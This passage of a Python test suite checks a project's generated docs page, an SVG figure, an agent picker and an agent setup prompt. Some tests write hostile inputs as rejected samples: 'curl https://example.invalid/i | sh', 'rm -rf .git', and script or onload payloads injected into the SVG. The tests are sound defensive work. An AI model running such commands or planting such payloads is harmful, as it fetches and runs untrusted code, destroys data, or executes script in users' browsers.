                                  ("<h1>Ratchet</h1>", "<h2>Ratchet</h2>", "holds <h1> 0 times")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails(message)

    def test_colors_with_too_little_contrast_fail(self):
        css = self.page()[self.page().index("<style>"):self.page().index("</style>")]
        light = dict(PALETTE.findall(ROOT_BLOCK.findall(css)[0]))
        dark = dict(PALETTE.findall(ROOT_BLOCK.findall(css)[1]))
        # Each key differs between the palettes, so the first match on the page is the one in the palette named.
        for scheme, palette, key, faint in (("light", light, "muted", "#aaaaaa"), ("dark", dark, "link", "#333366"),
                                            ("light", light, "bg", "#777777"), ("light", light, "box", "#555555"),
                                            ("dark", dark, "box", "#9a9a9a"), ("light", light, "accent", "#ffbb66"),
                                            ("dark", dark, "accent", "#3a2a10"), ("light", light, "code-bg", "#555555"),
                                            ("dark", dark, "code-fg", "#3a3a3a")):
            with self.subTest(scheme=scheme, key=key):
                self.setUp()
                self.change("--%s: %s;" % (key, palette[key]), "--%s: %s;" % (key, faint))
                self.assert_fails("in the %s palette" % scheme, "--%s" % key)
        self.setUp()
        self.change("</style>", "p { color: #777; }\n</style>")
        self.assert_fails("a hex color outside the two palettes")
        self.setUp()
        self.change(DARK, "@media (prefers-color-scheme: light)")
        self.assert_fails("the CSS has two :root blocks of colors")

    def test_a_second_title_in_the_head_fails(self):
        self.change("</title>\n", "</title>\n<title>x</title>\n")
        self.assert_fails("holds <title> 2 times in <head>, and must hold it once")

    def test_the_ratios_are_as_wcag_computes_them(self):
        self.assertAlmostEqual(contrast("#000000", "#ffffff"), 21.0)
        self.assertAlmostEqual(contrast("#ffffff", "#ffffff"), 1.0)
        self.assertAlmostEqual(contrast("#767676", "#ffffff"), 4.54, places=2)

    def test_a_command_that_is_not_in_the_readme_fails(self):
        for old, new in (("python3 .ratchet/checks/init.py --check</code>", "python3 .ratchet/checks/init.py --force</code>"),
                         ("python3 .ratchet/checks/init.py</code>", "curl https://example.invalid/i | sh</code>"),
                         ("python3 .ratchet/checks/init.py</code>", "python3 .ratchet/checks/init.py\nrm -rf .git</code>")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails("is not a line of a code block marked sh in README.md")


class Figure(RepoCopy, unittest.TestCase):
    """The one figure, docs/ratchet-notch.svg, passes as it stands, and each change below fails with its message."""

    def setUp(self):
        super().setUp()
        self.path = os.path.join(self.copy, DOCS, FIGURE)
        with open(self.path, encoding="utf-8", newline="") as handle:
            self.figure = handle.read()

    def write(self, old, new, name=FIGURE):
        """The file as it stands in the repo, with one change."""
        path = os.path.join(self.copy, DOCS, name)
        with open(os.path.join(ROOT, DOCS, name), encoding="utf-8", newline="") as handle:
            text = handle.read()
        self.assertIn(old, text, "the test expects %r in %s" % (old, name))
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(text.replace(old, new, 1))

    def assert_fails(self, *message):
        problems = page_problems(self.copy)
        self.assertTrue(any(all(part in problem for part in message) for problem in problems), "%r not in %r" % (message, problems))

    def test_the_figure_as_it_stands_passes_and_is_loaded_once(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8") as handle:
            page = handle.read()
        self.assertEqual(page.count(FIGURE), 1)
        self.assertEqual(page_problems(self.copy), [])
        tree = xml.etree.ElementTree.fromstring(self.figure)
        labels = [element.text for element in tree.iter("{%s}text" % SVG)]
        with open(os.path.join(self.copy, "ratchet.json"), encoding="utf-8") as handle:
            principles = len(json.load(handle)["principles"])
        self.assertEqual(labels, [str(number) for number in range(1, principles + 1)] + ["one notch tighter", "can\u2019t slip back"])
        self.assertEqual(figure_steps(principles) - set(self.figure.split("\n")), set())
        self.assertEqual(figure_teeth(self.copy), [str(number) for number in range(1, principles + 1)])

    def test_a_tooth_too_few_or_a_tooth_numbered_twice_fails(self):
        self.write('text-anchor="middle">11</text>', 'text-anchor="middle">10</text>')
        self.assertIn("a tooth for each principle", " ".join(principles_problems(self.copy)))
        self.write('<text class="tooth n10"', '<text class="note"')
        self.assertIn("a tooth for each principle", " ".join(principles_problems(self.copy)))

    def test_a_wheel_that_does_not_turn_one_tooth_for_each_principle_fails(self):
        # The wheel turns a tooth at a time: a stop of its turn for each principle, the angle of one tooth where it rests,
        # the same turned back for the numbers, and a delay for each number.
        for old, new in (("  9.0909% { rotate: 32.727deg; }\n", ""), ("  90%, 100% { rotate: 32.727deg; }", "  90%, 100% { rotate: 30deg; }"),
                         ("  9.0909% { rotate: -32.727deg; }\n", ""), ("  .n10 { animation-delay: -2.720s; }\n", "")):
            with self.subTest(old=old):
                self.write(old, new)
                self.assertIn("the wheel turns one tooth for each principle", " ".join(principles_problems(self.copy)))

    def test_a_figure_that_no_image_loads_or_that_is_loaded_twice_fails(self):
        image = '<img class="notch" src="ratchet-notch.svg"'
        for old, new, by in ((image, '<img class="notch" src="ratchet-light.svg"', "nothing"),
                             ("</main>", image + ' alt="x">\n</main>', "<img>, <img>"),
                             ('<link rel="icon" href="ratchet-light.svg"', '<link rel="icon" href="ratchet-notch.svg"', "<link>, <img>"),
                             (image, '<picture><source srcset="ratchet-notch.svg"></picture>\n<img src="ratchet-light.svg"', "<source>")):
            with self.subTest(new=new):
                self.write(old, new, PAGE)
                self.assert_fails("the figure ratchet-notch.svg is loaded by %s, and one <img> loads it, once" % by)

    def test_a_figure_without_alt_text_fails(self):
        self.write('height="344" alt="A ratchet wheel', 'height="344" alt=" " title="A ratchet wheel', PAGE)
        self.assert_fails("an <img> without alt text")

    def test_no_figure_or_a_link_in_its_place_fails(self):
        os.remove(self.path)
        self.assert_fails("docs/ must hold exactly")
        self.assert_fails("docs/ratchet-notch.svg: there is no such file")
        os.symlink("ratchet-light.svg", self.path)
        self.assert_fails("docs/ratchet-notch.svg: there is no such file")

    def test_a_figure_that_is_not_utf8_or_holds_a_hidden_character_fails(self):
        with open(self.path, "ab") as handle:
            handle.write(b"\xff\n")
        self.assert_fails("docs/ratchet-notch.svg: not valid UTF-8 at byte")
        for character in ("\r", "\t", "\u202e", "\u200b", "\ufeff"):
            with self.subTest(character=repr(character)):
                self.write(">one notch tighter<", ">one notch%stighter<" % character)
                self.assert_fails("docs/ratchet-notch.svg:", "holds U+%04X" % ord(character))

    def test_a_doctype_a_comment_a_processing_instruction_or_a_reference_fails(self):
        entity = '<!DOCTYPE svg [<!ENTITY x "failure">]>\n<svg '
        for old, new, mark in (("<svg ", entity, "'<!'"), ("<svg ", '<?xml version="1.0"?>\n<svg ', "'<?'"),
                               ("<svg ", '<?xml-stylesheet href="https://example.invalid/x.css"?>\n<svg ', "'<?'"),
                               ("</style>", "</style>\n<!-- x -->", "'<!'"), (">one notch tighter<", "><![CDATA[one notch]]><", "'<!'"),
                               (">one notch tighter<", ">one notch &#116;ighter<", "'&'"), (">one notch tighter<", ">one &amp; one<", "'&'")):
            with self.subTest(new=new):
                self.write(old, new)
                self.assert_fails("docs/ratchet-notch.svg: holds %s" % mark, "which the figure does not hold")

    def test_a_figure_that_is_not_well_formed_fails(self):
        for old, new in (("</svg>", ""), ('rx="8"/>', 'rx="8">'), ('rx="8"/>', 'rx="8" rx="8"/>'), ("<svg ", "x<svg ")):
            with self.subTest(new=new):
                self.write(old, new)
                self.assert_fails("docs/ratchet-notch.svg: not well-formed XML")

    def test_an_element_that_is_not_on_the_list_fails(self):
        for element in ("<script>alert(1)</script>", '<script href="https://example.invalid/t.js"/>', '<use href="#x"/>',
                        '<image href="https://example.invalid/x.png"/>', '<a href="https://example.invalid/"><text>x</text></a>',
                        "<foreignObject><p>x</p></foreignObject>", '<animate attributeName="x"/>', '<set attributeName="x"/>',
                        "<title>x</title>", "<defs/>", "<g><use/></g>", "<svg/>", '<svg xmlns="http://www.w3.org/2000/svg"/>',
                        '<circle xmlns="http://www.w3.org/1999/xhtml"/>', '<x:script xmlns:x="http://www.w3.org/1999/xhtml">1</x:script>'):
            with self.subTest(element=element):
                self.write("</style>", "</style>\n" + element)
                self.assert_fails("docs/ratchet-notch.svg:", "is not an element the figure may hold")
        self.write(' xmlns="http://www.w3.org/2000/svg"', "")
        self.assert_fails("docs/ratchet-notch.svg: <svg> is not an element the figure may hold")

    def test_an_attribute_that_is_not_on_the_list_fails(self):
        for attribute in ('onload="alert(1)"', 'onclick="x"', 'style="fill: red"', 'fill="#ff0000"', 'stroke="red"', 'id="x"',
                          'href="https://example.invalid/"', 'filter="url(#f)"', 'transform="rotate(45)"',
                          'xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://example.invalid/"'):
            with self.subTest(attribute=attribute):
                self.write('<circle class="pivot"', '<circle %s class="pivot"' % attribute)
                self.assert_fails("docs/ratchet-notch.svg: <circle> may not have the attribute")
        self.write('role="img"', 'role="img" onload="alert(1)"')
        self.assert_fails("docs/ratchet-notch.svg: <svg> may not have the attribute onload")

    def test_a_value_that_is_not_numbers_and_words_fails(self):
        for old, new in (('class="pivot"', 'class="url(#x)"'), ('class="pivot"', 'class=""'), ('r="8.5"', 'r="calc(1px)"'),
                         ('<path class="pawl" d="M', '<path class="pawl" d="M1 1; M'), ('text-anchor="end">can', 'text-anchor="javascript:x">can'),
                         ('aria-label="A ratchet wheel', 'aria-label="https://example.invalid/ A ratchet wheel')):
            with self.subTest(new=new):
                self.write(old, new)
                self.assert_fails("docs/ratchet-notch.svg:", "and a value in the figure is numbers and words")

    def test_an_element_or_text_out_of_place_fails(self):
        self.write(">one notch tighter<", '>one <circle class="ball" cx="1" cy="1" r="1"/><')
        self.assert_fails("docs/ratchet-notch.svg: <text> holds an element, and only the <svg> and a <g> hold elements")
        self.write('<g class="tick">', '<g class="tick" id="x">')
        self.assert_fails("docs/ratchet-notch.svg: <g> may not have the attribute id")
        for old, new in (("</style>", "</style>\nfailure"), ('rx="8"/>', 'rx="8">failure</rect>'), ("</svg>", "failure</svg>")):
            with self.subTest(new=new):
                self.write(old, new)
                self.assert_fails("docs/ratchet-notch.svg: text in or after", "the figure holds text only in <text> and <style>")

    def test_a_figure_without_its_role_its_name_or_its_one_style_fails(self):
        for old, new in (('role="img" ', ""), ('role="img"', 'role="presentation"')):
            with self.subTest(new=new):
                self.write(old, new)
                self.assert_fails('docs/ratchet-notch.svg: the <svg> has role="img" and an aria-label that names it')
        self.write(self.figure[self.figure.index(" aria-label="):self.figure.index(">")], "")
        self.assert_fails('docs/ratchet-notch.svg: the <svg> has role="img" and an aria-label that names it')
        self.write("</style>", "</style>\n<style>text { fill: red; }</style>")
        self.assert_fails("docs/ratchet-notch.svg: holds <style> 2 times, and must hold it once")
        self.write(self.figure[self.figure.index("<style>"):self.figure.index("</style>") + len("</style>")], "")
        self.assert_fails("docs/ratchet-notch.svg: holds <style> 0 times, and must hold it once")

    def test_css_in_the_figure_that_the_page_may_not_hold_fails(self):
        for css, message in (('@import "https://example.invalid/x.css";', "holds @import"),
                             ("@font-face { font-family: x; }", "holds @font-face"),
                             (".ball { fill: url(#g); }", 'holds "url"'), (".ball { fill: \\75rl(x); }", "holds a backslash"),
                             (".ball { r: calc(1px); }", "calls calc()"), (".ball { fill: #ff0000; }", "a hex color outside the two palettes"),
                             (".ball { transition: fill 1s; }", "moves the page outside"), (".ball {", "a brace that is not matched")):
            with self.subTest(css=css):
                self.write("</style>", css + "\n</style>")
                self.assert_fails("docs/ratchet-notch.svg: the CSS ", message)
        self.write(DARK, "@media (prefers-color-scheme: light)")
        self.assert_fails("docs/ratchet-notch.svg: the CSS has two :root blocks of colors")

    def test_a_color_that_is_faint_or_not_the_pages_fails(self):
        light, dark = palettes(self.figure)
        for scheme, palette, key, faint in (("light", light, "muted", "#aaaaaa"),
                                            ("dark", dark, "fg", "#3a3a3a"), ("dark", dark, "box", "#9a9a9a"),
                                            ("light", light, "signal", "#222222")):
            with self.subTest(scheme=scheme, key=key):
                self.write("--%s: %s;" % (key, palette[key]), "--%s: %s;" % (key, faint))
                self.assert_fails("docs/ratchet-notch.svg: in the %s palette" % scheme, "--%s" % key, "under 4.5")
        # A color with contrast enough that is not the page's, the border, which is in no pair, and a name the page does not have.
        for old, new, message in (("--fg: %s;" % light["fg"], "--fg: #000000;", "in the light palette, --fg is #000000, and the page's is %s" % light["fg"]),
                                  ("--edge: %s;" % dark["edge"], "--edge: #444444;", "in the dark palette, --edge is #444444"),
                                  ("--edge: %s;" % light["edge"], "--edge: %s;\n  --line: #000000;" % light["edge"], "the light and the dark palette name different colors")):
            with self.subTest(new=new):
                self.write(old, new)
                self.assert_fails("docs/ratchet-notch.svg: " + message)
        self.write("--edge: %s;" % light["edge"], "--edge: %s;\n  --line: #000000;" % light["edge"])
        with open(self.path, encoding="utf-8", newline="") as handle:
            text = handle.read()
        with open(self.path, "w", encoding="utf-8", newline="") as handle:
            handle.write(text.replace("--edge: %s;" % dark["edge"], "--edge: %s;\n    --line: #ffffff;" % dark["edge"]))
        self.assert_fails("docs/ratchet-notch.svg: in the light palette, --line is #000000, and the page's is not there")

    def test_a_color_of_the_page_that_moves_fails_until_the_figure_follows(self):
        self.write("--muted: #56524a;", "--muted: #504c44;", PAGE)
        self.assert_fails("docs/ratchet-notch.svg: in the light palette, --muted is #56524a, and the page's is #504c44")

    def test_the_accent_in_the_figure_fails(self):
        # The accent stands only on what is clicked, and the figure is not: a color the figure's palette names is the
        # page's of the same name, and the accent, though the page has it, is refused by its name.
        self.write("  --fg: #15140f;", "  --fg: #15140f;\n  --accent: #b23a04;")
        with open(self.path, encoding="utf-8", newline="") as handle:
            text = handle.read()
        with open(self.path, "w", encoding="utf-8", newline="") as handle:
            handle.write(text.replace("    --fg: #edeadf;", "    --fg: #edeadf;\n    --accent: #ff9648;"))
        self.assert_fails("docs/ratchet-notch.svg: the figure names --accent, which stands only on what is clicked")


class PageFetchLine(RepoCopy, unittest.TestCase):
    """generate.py writes the line on the page that fetches Ratchet, and --check fails when it is not current."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def write_page(self, text):
        with open(os.path.join(self.copy, DOCS, PAGE), "w", encoding="utf-8", newline="") as handle:
            handle.write(text)

    def test_the_page_fetches_what_the_readme_fetches(self):
        version, fetched = first_entry(self.copy)
        line = "<pre><code>%s</code></pre>" % (FETCH % fetched)
        # The prompt holds the same command, as text, before the command of the page.
        self.assertEqual(lines_that_hold(self.page(), "git clone"), [FETCH % fetched, line])
        with open(os.path.join(self.copy, "README.md"), encoding="utf-8") as handle:
            self.assertIn("   " + FETCH % fetched + "\n", handle.read())

    def test_a_release_that_moves_only_the_readme_fails_and_generate_moves_the_page(self):
        version, fetched = first_entry(self.copy)
        self.assertNotEqual(version, fetched)
        before = self.page()
        # The release gives the entry its date and moves the README, as AGENTS.md says. Then the page is stale.
        path = os.path.join(self.copy, "CHANGELOG.md")
        with open(path, encoding="utf-8", newline="") as handle:
            changelog = handle.read()
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(changelog.replace("## %s (unreleased)" % version, "## %s (2026-12-01)" % version, 1))
        path = os.path.join(self.copy, "README.md")
        with open(path, encoding="utf-8", newline="") as handle:
            readme = handle.read()
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(readme.replace("--branch v%s " % fetched, "--branch v%s " % version))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("docs/index.html: generated text is out of date or was edited by hand", output)
        code, output = run("generate.py", root=self.copy, cwd=self.copy)
        self.assertEqual(code, 0, output)
        self.assertIn("wrote docs/index.html", output)
        self.assertEqual(self.page(), before.replace(FETCH % fetched, FETCH % version))
        # The release moved the prompt with the command: both hold the new version, and nothing holds the old one.
        self.assertEqual(lines_that_hold(self.page(), "git clone"), [FETCH % version, "<pre><code>%s</code></pre>" % (FETCH % version)])
        self.assertIn("   " + FETCH % version, page_prompt(self.page()))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 0, output)
        self.assertEqual(page_problems(self.copy), [])

    def test_an_indented_fetch_line_passes_as_generate_reads_it(self):
        # generate.py reads the line after the spaces that indent it, so the test reads it the same way.
        version, fetched = first_entry(self.copy)
        line = "<pre><code>%s</code></pre>" % (FETCH % fetched)
        self.write_page(self.page().replace(line, "  " + line, 1))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 0, output)
        self.assertEqual(lines_that_hold(self.page(), "git clone"), [FETCH % fetched, line])
        self.assertEqual(page_problems(self.copy), [])

    def test_the_page_moved_ahead_of_the_readme_fails(self):
        version, fetched = first_entry(self.copy)
        self.write_page(self.page().replace(FETCH % fetched, FETCH % version))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("docs/index.html: generated text is out of date or was edited by hand", output)

    def test_a_fetch_line_of_another_form_fails(self):
        version, fetched = first_entry(self.copy)
        line = "<pre><code>%s</code></pre>" % (FETCH % fetched)
        for new in ("", line + "\n" + line, "<pre><code>%s && git -C .ratchet checkout main</code></pre>" % (FETCH % fetched),
                    "<p>%s</p>" % (FETCH % fetched), line + "\n<p>Or git clone the repo.</p>",
                    "<pre><code>%s</code></pre>" % (FETCH % "1.x")):
            with self.subTest(new=new):
                self.setUp()
                first_entry(self.copy)
                self.write_page(self.page().replace(line, new, 1))
                code, output = run("generate.py", "--check", root=self.copy)
                self.assertEqual(code, 1, output)
                self.assertIn("docs/index.html: the command that fetches Ratchet must be one line", output)
                self.assertNotIn("Traceback", output)
                code, output = run("generate.py", root=self.copy, cwd=self.copy)
                self.assertEqual(code, 1, output)
                self.assertNotIn("wrote docs/index.html", output)

    def test_no_page_fails(self):
        os.remove(os.path.join(self.copy, DOCS, PAGE))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("docs/index.html: the file is missing", output)

    def test_a_page_that_is_not_utf8_fails_without_a_traceback(self):
        with open(os.path.join(self.copy, DOCS, PAGE), "ab") as handle:
            handle.write(b"\xff\n")
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("is not valid UTF-8", output)
        self.assertNotIn("Traceback", output)


class PagePicker(RepoCopy, unittest.TestCase):
    """The picker is the agents of TOOLS, and what a line says of a file is what checks/init.py does with it."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def problems(self, text, files=init.INSTRUCTION_FILES):
        return picker_problems(text, text[text.index("<style>"):text.index("</style>")], files)

    def test_the_picker_as_it_stands_passes(self):
        self.assertEqual(self.problems(self.page()), [])

    def test_every_file_a_line_says_init_sees_is_one_init_reads_and_the_other_is_not(self):
        for slug, label, file, seen in TOOLS:
            if file is not None:
                self.assertEqual(file in init.INSTRUCTION_FILES, seen, file)
        self.assertEqual([seen for _, _, _, seen in TOOLS].count(False), 1)

    def test_the_file_the_line_of_claude_code_also_names_is_the_one_its_template_points_at(self):
        with open(os.path.join(ROOT, "templates", "CLAUDE.md"), encoding="utf-8", newline="") as handle:
            self.assertIn(POINTS_AT, handle.read())
        self.assertEqual(POINTS_AT, "\n@%s\n" % ALSO_NAMED["claude-code"])
        self.assertEqual(list(ALSO_NAMED), ["claude-code"])

    def test_a_line_that_says_of_a_file_what_init_does_not_do_fails(self):
        # init.py learns to see the file of the one agent it did not, or stops seeing one: the page fails until it follows.
        for files, message in ((init.INSTRUCTION_FILES + (".cursor/rules",), "does not see .cursor/rules, the file of Cursor"),
                               (tuple(each for each in init.INSTRUCTION_FILES if each != "GEMINI.md"), "sees GEMINI.md, the file of Gemini CLI")):
            with self.subTest(files=files):
                self.assertTrue(any(message in problem for problem in self.problems(self.page(), files)), self.problems(self.page(), files))

    def test_a_picker_changed_by_hand_fails(self):
        cursor = "Cursor reads <code>.cursor/rules</code>, which <code>init.py</code> does not see"
        for old, new, message in (
                ("<code>CLAUDE.md</code>: <code>init.py</code> sees", "<code>CLAUDE.txt</code>: <code>init.py</code> sees",
                 "the line of Claude Code names AGENTS.md, CLAUDE.txt in <code>, and must name AGENTS.md, CLAUDE.md and init.py only"),
                ("points at <code>AGENTS.md</code>", "points at AGENTS.md",
                 "the line of Claude Code names CLAUDE.md in <code>, and must name AGENTS.md, CLAUDE.md and init.py only"),
                ("points at <code>AGENTS.md</code>", "points at <code>GEMINI.md</code>",
                 "the line of Claude Code names CLAUDE.md, GEMINI.md in <code>"),
                ("points at <code>AGENTS.md</code>", "points at <code>AGENTS.md</code> and <code>README.md</code>",
                 "the line of Claude Code names AGENTS.md, CLAUDE.md, README.md in <code>"),
                ("Codex reads <code>AGENTS.md</code>", "Codex reads <code>AGENTS.md</code> and <code>CODEX.md</code>",
                 "the line of Codex names AGENTS.md, CODEX.md in <code>"),
                (cursor, "Cursor reads <code>.cursor/rules</code>: " + SEES, "the line of Cursor must say"),
                (cursor + ": if your rules stand there, " + INVENTORY_FIRST, cursor, "the line of Cursor must say"),
                ("Gemini CLI reads <code>GEMINI.md</code>: " + SEES, "Gemini CLI reads <code>GEMINI.md</code>, " + NOT_SEEN,
                 "the line of Gemini CLI must say"),
                ("Another agent that can run commands in your repo", "Another agent, which reads <code>RULES.md</code>",
                 "the line of Other names RULES.md in <code>, and must name no file"),
                ('<input type="radio" name="tool" id="tool-codex">', '<input type="radio" name="tool" id="tool-codex" checked="checked">',
                 "radio 2 of the picker"),
                (' id="tool-claude-code" checked="checked"', ' id="tool-claude-code"', "radio 1 of the picker"),
                ('<label for="tool-codex">Codex</label>', '<label for="tool-cursor">Codex</label>', "label 2 of the picker"),
                ('<label for="tool-copilot">GitHub Copilot</label>', '<label for="tool-copilot">Copilot, tested</label>', "label 5 of the picker"),
                ('<p class="where for-codex">', '<p class="where for-cursor">', "line 2 of the picker"),
                ('<input type="radio" name="tool" id="tool-other">\n<label for="tool-other">Other</label>\n', "", "Found <legend>"),
                ("<legend>Your coding agent</legend>\n", "", "Found <input>"),
                ("<legend>Your coding agent</legend>", "<legend></legend>", "the <legend> of the picker names it"),
                ("<legend>Your coding agent</legend>", "<legend>Your coding agent</legend>\nTried in all of them.", "holds text that stands in none"),
                ("#tool-codex:checked ~ .for-codex,\n", "", "the CSS does not hold #tool-codex:checked ~ .for-codex"),
                ("#tool-codex:checked ~ .for-codex,", "#tool-codex:checked ~ .for-codex,\n#tool-codex:checked ~ .prompt,",
                 "the CSS reads :checked ~ 7 times"),
                ('<fieldset class="tools">', '<fieldset class="other">', "holds one picker"),
                ("</main>", "<fieldset></fieldset>\n</main>", "Found <fieldset> 2 times")):
            with self.subTest(new=new):
                text = self.page()
                self.assertIn(old, text)
                problems = self.problems(text.replace(old, new, 1))
                self.assertTrue(any(message in problem for problem in problems), "%r not in %r" % (message, problems))

    def test_the_page_fails_on_a_picker_changed_by_hand(self):
        self.edit("docs/index.html", "<code>GEMINI.md</code>", "<code>GEMINI.txt</code>")
        self.assertTrue(any("the line of Gemini CLI names GEMINI.txt" in problem for problem in page_problems(self.copy)))


class PagePrompt(RepoCopy, unittest.TestCase):
    """generate.py writes the prompt on the page, --check fails on a prompt edited by hand, and the test holds it too."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def write_page(self, text):
        with open(os.path.join(self.copy, DOCS, PAGE), "w", encoding="utf-8", newline="") as handle:
            handle.write(text)

    def test_the_prompt_is_the_one_the_test_expects_at_the_released_version(self):
        released = generate.changelog_context(self.copy)[1]
        prompt = page_prompt(self.page())
        self.assertEqual(prompt, [line % (FETCH % released) if "%s" in line else line for line in PROMPT_LINES])
        self.assertEqual(prompt_problems(self.copy, self.page()), [])
        self.assertEqual(list(generate.PROMPT), list(PROMPT_LINES))
        # What it asks for: the three steps, the stop before anything is written, and no commit, push or required check.
        for words in (FETCH % released, "python3 .ratchet/checks/init.py --check", "Stop there.", "Ask me before you run anything that writes",
                      "init.py with --adopt", "follow .ratchet/STARTING.md", "Do not commit, push, or make a check required"):
            self.assertIn(words, "\n".join(prompt))

    def test_a_prompt_edited_by_hand_fails_and_generate_writes_it_again(self):
        released = generate.changelog_context(self.copy)[1]
        before = self.page()
        for old, new in (("Do not commit, push, or make a check required without asking me first.", "Commit and push when you are done."),
                         ("3. Stop there. ", "3. Go on. "),
                         ("   " + FETCH % released, "   " + FETCH % "0.1"),
                         ("   python3 .ratchet/checks/init.py --check", "   python3 .ratchet/checks/init.py"),
                         ("4. When I have said yes, follow .ratchet/STARTING.md, one step at a time.\n", ""),
                         ("\nDo not commit, push,", "\nThen require the check in the protection of main.\nDo not commit, push,"),
                         ("Set up Ratchet in this git repo.", "  Set up Ratchet in this git repo.")):
            with self.subTest(new=new):
                self.assertIn(old, before)
                self.write_page(before.replace(old, new, 1))
                self.assertTrue(any("the prompt is not the one the test expects" in problem for problem in prompt_problems(self.copy, self.page())))
                code, output = run("generate.py", "--check", root=self.copy)
                self.assertEqual(code, 1, output)
                self.assertIn("docs/index.html: generated text is out of date or was edited by hand", output)
                code, output = run("generate.py", root=self.copy, cwd=self.copy)
                self.assertEqual(code, 0, output)
                self.assertIn("wrote docs/index.html", output)
                self.assertEqual(self.page(), before)

    def test_a_prompt_of_another_form_fails_and_generate_writes_nothing(self):
        before = self.page()
        first = PROMPT_OPEN + "\n" + PROMPT_LINES[0]
        for old, new in ((first, PROMPT_OPEN + "\n<strong>Set up Ratchet</strong> in this git repo."),
                         (first, PROMPT_OPEN + "\n" + PROMPT_LINES[0] + " &amp; push"),
                         (first, PROMPT_OPEN + "\n" + PROMPT_LINES[0] + " \u2192"),
                         (first, PROMPT_OPEN + "\n" + PROMPT_LINES[0] + "</pre>\n<pre>"),
                         (PROMPT_OPEN, "  " + PROMPT_OPEN),
                         (PROMPT_OPEN, '<pre class="prompt" id="prompt">'),
                         (PROMPT_OPEN, PROMPT_OPEN + "\n" + PROMPT_CLOSE + "\n" + PROMPT_OPEN),
                         ("first.\n" + PROMPT_CLOSE, "first.\n  " + PROMPT_CLOSE + "\n<p>x</p>"),
                         ("first.\n" + PROMPT_CLOSE, "first.\n" + PROMPT_CLOSE + '\n<p id="prompt">x</p>'),
                         (PROMPT_OPEN, PROMPT_OPEN.replace("<pre", "<pre  "))):
            with self.subTest(new=new):
                self.assertIn(old, before)
                self.write_page(before.replace(old, new, 1))
                code, output = run("generate.py", "--check", root=self.copy)
                self.assertEqual(code, 1, output)
                self.assertIn("docs/index.html: the prompt must be the line", output)
                self.assertNotIn("Traceback", output)
                code, output = run("generate.py", root=self.copy, cwd=self.copy)
                self.assertEqual(code, 1, output)
                self.assertNotIn("wrote docs/index.html", output)

    def test_a_marker_in_the_prompt_beyond_its_one_fetch_line_fails_and_generate_writes_nothing(self):
        # Only the prompt's one fetch line is let past the count of "git clone". A second clone, or the marker of the
        # count or of the sources, in the prompt fails as anywhere else on the page, and generate.py writes nothing.
        released = generate.changelog_context(self.copy)[1]
        fetch = "   " + FETCH % released
        for new, marker in ((fetch + "\n   git clone https://example.invalid/x", "git clone"),
                            (fetch.replace(" .ratchet", " ratchet"), "git clone"),
                            (fetch + "\n" + fetch, "git clone"),
                            (fetch + '\nsee id="count" here', 'id="count"'),
                            (fetch + '\nsee id="sources" here', 'id="sources"')):
            with self.subTest(new=new):
                before = self.page()
                self.assertIn(fetch, before)
                self.write_page(before.replace(fetch, new, 1))
                code, output = run("generate.py", "--check", root=self.copy)
                self.assertEqual(code, 1, output)
                self.assertIn("no other line may hold %s" % marker, output)
                code, output = run("generate.py", root=self.copy, cwd=self.copy)
                self.assertEqual(code, 1, output)
                self.assertNotIn("wrote docs/index.html", output)
                self.write_page(before)

    def test_a_command_of_the_prompt_that_is_not_in_the_readme_or_a_file_that_is_not_there_fails(self):
        text = self.page().replace("   python3 .ratchet/checks/init.py --check", "   curl https://example.invalid/i | sh", 1)
        self.assertIn("the command 'curl https://example.invalid/i | sh' of the prompt is not a line of a code block marked sh in README.md",
                      " ".join(prompt_problems(self.copy, text)))
        os.remove(os.path.join(self.copy, "STARTING.md"))
        self.assertIn("the prompt tells the agent to follow STARTING.md, which is not a file in this checkout",
                      " ".join(prompt_problems(self.copy, self.page())))

    def test_no_prompt_or_a_second_one_fails(self):
        for old, new in ((PROMPT_OPEN, '<pre class="prompt">'), ("</main>", PROMPT_OPEN + "\nx\n" + PROMPT_CLOSE + "\n</main>")):
            with self.subTest(new=new):
                self.assertIn("holds one prompt", " ".join(prompt_problems(self.copy, self.page().replace(old, new, 1))))


# The line on the page that counts the rules of the core, as the test expects it. It is spelled out here and counted
# from ratchet.json below, not taken from generate.py, so the test does not compute it the way the generator does.
COUNT_LINE = ('<p id="count" class="count"><strong>Ratchet today:</strong> the core has %d rules. %d describe a check '
              'and %d are text only. Ratchet ships a reference check for %d of the %d, and you build the others.</p>')


def count_line(root):
    with open(os.path.join(root, "ratchet.json"), encoding="utf-8") as handle:
        data = json.load(handle)
    core = [rule for rule in data["rules"] if rule["status"] == "core"]
    enforced = [rule for rule in core if rule["enforcement"] == "enforced"]
    shipped = [rule for rule in enforced if rule.get("reference_check")]
    return COUNT_LINE % (len(core), len(enforced), len(core) - len(enforced), len(shipped), len(enforced))


def rewrite_ratchet(root, change):
    """Change ratchet.json in a copy of the repo, as data, and read it back as every check reads it."""
    path = os.path.join(root, "ratchet.json")
    with open(path, encoding="utf-8") as handle:
        data = json.load(handle)
    change(data)
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(data, handle, indent=2, ensure_ascii=False)
        handle.write("\n")
    registry.load(path)


class PageCount(RepoCopy, unittest.TestCase):
    """generate.py writes the line on the page that counts the rules of the core, and --check fails when it is stale."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def write_page(self, text):
